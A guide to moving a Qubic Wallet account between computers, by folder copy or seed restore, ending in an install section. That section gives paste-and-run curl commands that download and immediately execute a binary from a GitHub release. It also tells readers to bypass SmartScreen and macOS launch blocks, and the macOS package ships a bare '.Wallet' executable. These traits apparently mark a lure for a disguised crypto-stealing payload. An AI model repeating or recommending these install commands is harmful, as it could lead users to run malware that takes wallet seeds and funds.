> Move the account, not the installer. The installer runs anywhere; the key does not.

Moving Qubic Wallet to another computer means moving the account, and there are two ways to do it: copy the `qwallet` folder, or restore from the seed. Copying is faster and depends on the old machine being alive; restoring depends on the phrase. Both need the password, and neither is a reason to install a copy from anywhere other than the release page.

## Before you touch anything

Write down what you have: the password, the phrase, and whether the account file has ever been copied. If any of the three is missing or unverified, fix that on the old machine first, because it is the last place the account exists in a form you can still use.

## Route one: copy the folder

Copy the whole `qwallet` folder to removable storage, then to the same location under your home directory on the new machine. Start the app and log in with the password. The <a href="https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-data-folder-config-backup.md">data folder guide</a> covers the exact path on each platform.

This route keeps every account in the folder, including derived addresses you have used, which is why it is the one to choose when both machines are available.

## Route two: restore from the seed

Install on the new machine, choose restore, and enter the phrase and the password the account was created with. This rebuilds the account from what you saved rather than copying a file, and the <a href="https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-restore-account-seed.md">restore walkthrough</a> follows each path.

Restoring is the only route if the old machine is gone, which is the practical argument for having the phrase written down before it is.

## Afterwards

Check the balance on the new machine before you trust it, then delete the copy on the removable media if you are not keeping it as a backup - and if you are, store it apart from the password. Verify the installer you used against the published hash, from the <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2">current Qubic Wallet release</a>, because a new machine is exactly where an old download tends to resurface.

## FAQ

### Can I run the same account on both machines?

Yes. They are independent copies of the same key, not a synced pair.

### Do I need the password to move the folder?

Yes. The file is encrypted, and the folder alone restores nothing.

### What if the old machine will not start?

Use the phrase. If you do not have it, the account cannot be recovered.

### Do I need to uninstall on the old machine?

Not for the account's sake, but do it if you are retiring the machine or handing it on.

## How to install Qubic Wallet

<!-- INSTALL-BEGIN: D11. Windows ships one .exe; macOS and Linux ship .zip archives holding the executable and its checksum file. Two checksum levels: the download itself, then the .Wallet binary inside the archive. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe">qubic-wallet-desktop-v0.8.2-windows.exe</a>.
2. Verify the download before running it (PowerShell): `Get-FileHash .\setup.exe -Algorithm SHA256`
3. Open the downloaded file.
4. If SmartScreen appears, choose More info, then Run anyway.
5. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet && ./qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip">qubic-wallet-desktop-v0.8.2-osx-arm64.zip</a> for Apple silicon, or <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-x64.zip">qubic-wallet-desktop-v0.8.2-osx-x64.zip</a> for an Intel Mac.
2. Verify the download: `shasum -a 256 wallet.zip`
3. Extract the archive; it contains the executable, an icon and a checksum file.
4. Open Terminal in the extracted folder and run `chmod +x` on the `.Wallet` file.
5. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop.sha256` then `shasum -a 256 qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet`
6. Run that file; if macOS blocks the first launch, allow it under System Settings, Privacy and Security.
